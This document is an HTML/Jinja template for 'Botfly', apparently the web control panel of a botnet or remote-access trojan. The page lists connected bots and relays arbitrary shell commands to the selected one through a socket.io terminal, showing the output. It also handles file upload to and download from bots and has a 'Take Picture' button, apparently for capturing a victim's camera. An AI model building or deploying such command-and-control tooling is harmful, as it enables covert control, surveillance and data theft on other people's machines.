<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>Botfly</title>

    <!-- Bootstrap Core CSS -->
    <link href="../static/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom CSS -->
    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='css/custom.css') }}">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
    <script src="http://code.jquery.com/ui/1.9.2/jquery-ui.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.terminal/0.10.12/js/jquery.terminal.min.js"></script>
    <script type="text/javascript"
            src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/1.3.5/socket.io.min.js"></script>

    <script type="text/javascript"
            src="{{ url_for('static', filename='js/hotkeys.js') }}"></script>
    <script type="text/javascript"
            src="{{ url_for('static', filename='js/socketio.js') }}"></script>


    <link href="https://cdnjs.cloudflare.com/ajax/libs/jquery.terminal/0.10.12/css/jquery.terminal.min.css"
          rel="stylesheet"/>

</head>
<body>


{% include 'nav.html' %}
<!-- Page Content -->
<div class="container">
    <div class="row">
        <div class="col-md-3">
            <div class="form-group">
                <div class="input-group">
                    <!-- Find a way to make this class selectpicker and have it work-->
                    <select class="form-control" id="bot" name="bot" style="width: 242px">
                        <option value="default" disabled selected>Select bot...</option>
                        {% for bot in bot_list %}
                        <option value="{{ bot }}">{{ bot }}</option>
                        {% endfor %}
                    </select>
                </div>
            </div>
            <button type="button" class="btn btn-primary">Take Picture</button>
            <button type="button" class="btn btn-primary">Do Other Stuff</button>
            <form id="upload-file" method="post" enctype="multipart/form-data">
                <fieldset>
                    <label class="btn btn-default btn-file">
                        Upload File <input name="file" type="file" style="display: none;">
                    </label>
                </fieldset>
            </form>
        </div>
        <!--</form>-->

        <div class="col-md-9">
            <div id="terminal"></div>
        </div>
    </div>
    <!-- /.row -->
</div>
<!-- /.container -->

<script>
    terminalFontSize = 14;
    terminalMargin = 2;
    $(document).ready(function () {
        $('head').append('<style id="terminalFont" type="text/css">.terminal-output, .cmd {font-size:' + terminalFontSize + 'px;}</style>');
        $('head').append('<style id="terminalMargin" type="text/css">.terminal div {margin-bottom:' + terminalMargin + 'px;}</style>');

        //sets the terminal text color and font-size
        function textStyle(message) {
            return "[[;#90b1e5;black]" + message + "]";
        }

        hotkeys('command+=, command+-', function (event, handler) {
            switch (handler.key) {
                case "command+=":
                    terminalMargin += .15;
                    terminalFontSize += .2;
                    break;
                case "command+-":
                    terminalMargin -= .15;
                    terminalFontSize -= .2;
                    break;
            }
            $('#terminalFont').text('.terminal-output, .cmd {font-size:' + terminalFontSize + 'px;}');
            $('#terminalMargin').text('.terminal div {margin-bottom:' + terminalMargin + 'px;}');
        });

        terminal = $('#terminal').terminal(function (command, term) {
            //no bot selected
            if ('{{connected}}' == '') {
                terminal.error('No bot selected.');
                return;
            }
            if (command == 'clear') {
                term.clear();
            }

            //download file from bot
//            var splitCommand = command.split(" ");
//            if (splitCommand[0] == "download") {
//                if (splitCommand.length != 2) {
//                    term.error("usage: download <filename>")
//                }
//                downloadFile(splitCommand[1]);
//                return;
//            }

            //send terminal command to server
            socket.emit('send_command', {data: command});
            socket.removeAllListeners('send_command'); //Sloppy, fix this if can. should be outside terminal function ideally
        }, {
            greetings: 'Botfly Terminal',
            height: 800,
            width: 800,
            //update prompt to be name of current user
            prompt: function (callback) {
                callback('{{connected}}> ');
            }
        });

        socket.on('response', function (msg) {
            //error returned from bot
            if (msg.stderr != '') {
                terminal.error(msg.stderr);

            }
            if (msg.stdout != "Server generated event" && msg.stdout != '') {
                terminal.echo(textStyle(msg.stdout));
            }

        });

        //new connection received
        socket.on('connection', function (msg) {
            $('.col-md-3').append('<p class="conn-' + msg.user + '">' + 'New connection from: ' + msg.user + '</p>');
            $('.conn-' + msg.user).fadeOut(5000);
            $("#bot").append('<option value="' + msg.user + '">' + msg.user + '</option>')
        });

        //TODO: consolidate
        //repetitive code: will remove later
        socket.on('disconnect', function (msg) {
            $('.col-md-3').append('<p class="disconn-' + msg.user + '">' + 'Lost connection to: ' + msg.user + '</p>');
            $('.disconn-' + msg.user).fadeOut(5000);
            $("#bot option[value='" + msg.user + "']").remove();
        });

        //success message received from server
        socket.on('success', function (msg) {
            terminal.echo(textStyle(msg.message))
        });

        //new bot selected
        $(function () {
            $('#bot').change(function () {
                var value = $(this).val();
                $.ajax({
                    type: "POST",
                    url: "#",
                    data: {
                        bot: value
                    },
                    success: function (data) {
                        location.reload();
                    }
                });
            });
        });

        //upload a file to the server
        $(function () {
            $('#upload-file').change(function () {
                //no bot selected
                if ('{{connected}}' == '') {
                    terminal.error('No bot selected.');
                    return;
                }
                var form_data = new FormData($('#upload-file')[0]);
                $.ajax({
                    type: 'POST',
                    url: '/uploader',
                    data: form_data,
                    contentType: false,
                    cache: false,
                    processData: false,
                    success: function (data) {
                        if (JSON.parse(data).success) {
                            terminal.echo(textStyle("File upload in progress..."))
                        } else {
                            terminal.error(textStyle("File upload failed"))
                        }
                    },
                });
            });
        });

        // download file from connected bot
        function downloadFile(filename) {
            $.ajax({
                type: "POST",
                url: "/downloader",
                data: {
                    file: filename
                },
                success: function (data) {
                    console.log(data);
                    var blob = new Blob([data]);
                    var link = document.createElement('a');
                    link.href = window.URL.createObjectURL(blob);
                    link.download = filename;
                    link.click();
                    terminal.echo(textStyle("Download successful"))
                }
            });
        }

    });
</script>


</body>
</html>
